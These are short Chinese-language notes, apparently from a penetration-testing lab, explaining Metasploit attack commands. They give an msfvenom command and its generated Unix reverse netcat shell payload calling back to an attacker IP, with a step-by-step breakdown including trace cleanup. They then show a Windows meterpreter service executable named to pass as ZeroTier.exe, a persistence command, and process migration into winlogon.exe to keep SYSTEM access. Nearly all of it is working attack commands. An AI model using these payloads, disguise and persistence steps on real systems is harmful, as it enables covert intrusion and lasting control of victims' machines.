```
msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.45.240 LPORT=4444 R
```
🧠 逐项中文解释
1. msfvenom
Metasploit 的 payload 生成工具，用来生成反弹 shell、木马、编码后的 payload 等。

2. -p cmd/unix/reverse_netcat
选择 payload 类型：
使用 Netcat 反弹 Shell（Unix 环境）

也就是生成一个命令，让目标机器主动连接攻击者的 IP 和端口，从而获得 Shell。

3. LHOST=192.168.45.240
攻击者的 IP
（也就是你的监听端的 IP）

4. LPORT=4444
攻击者本地监听端口
（你的 nc / msfconsole 将在这个端口等待连接）

5. R
表示输出 原始格式（raw），不做编码、不指定文件格式。

📌 Metasploit 输出解释：
yaml
Copy code
[-] No platform was selected, choosing Unix
[-] No arch selected, selecting cmd
No encoder specified, outputting raw payload
Payload size: 100 bytes
意思是：

你没有指定平台 → 自动选择 Unix

你没有指定架构 → 自动选择 cmd

没有指定编码器 → 输出最原始命令

payload 大小是 100 字节

📦 最终生成的 Payload：
bash
Copy code
mkfifo /tmp/xnrkkg; nc 192.168.45.240 4444 0</tmp/xnrkkg | /bin/sh >/tmp/xnrkkg 2>&1; rm /tmp/xnrkkg
🔍 中文解释：反向 Netcat Shell 工作原理
这条命令实现的是：

1️⃣ 创建一个命名管道（FIFO）
bash
Copy code
mkfifo /tmp/xnrkkg
用于让 /bin/sh 与 nc 双向通信。

2️⃣ 使用 nc 连接攻击者的主机
nginx
Copy code
nc 192.168.45.240 4444
目标机器会主动连接攻击者的 listener。

3️⃣ 把 nc 的输入送给 /bin/sh
bash
Copy code
0</tmp/xnrkkg | /bin/sh
相当于：
攻击者输入的命令在目标机器中由 /bin/sh 执行。

4️⃣ 把 /bin/sh 的输出返回给 nc
shell
Copy code
>/tmp/xnrkkg 2>&1
stdout 和 stderr 都回传给攻击者。

5️⃣ 退出后清理管道
bash
Copy code
rm /tmp/xnrkkg
删除痕迹。

🎯 一句话总结
这条 payload 让目标 Linux 机器 主动连接 你的 192.168.45.240:4444，并通过一个命名管道实现一个稳定的反向 /bin/sh shell。

use -f exe-serviec , not -f exe, will make serivce strong

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe-service -o ZeroTier.exe
```

在 Meterpreter 中执行：
```
run persistence -U -i 5 -p 4444 -r <你的IP>
```
or
msf 

```
set InitialAutoRunScript "migrate -n explorer.exe"
run
```

```
set AutoRunScript "migrate -n winlogon.exe"

```
# Try to jump into winlogon (it always runs as SYSTEM and never stops)
```

run migrate -n winlogon.exe
```

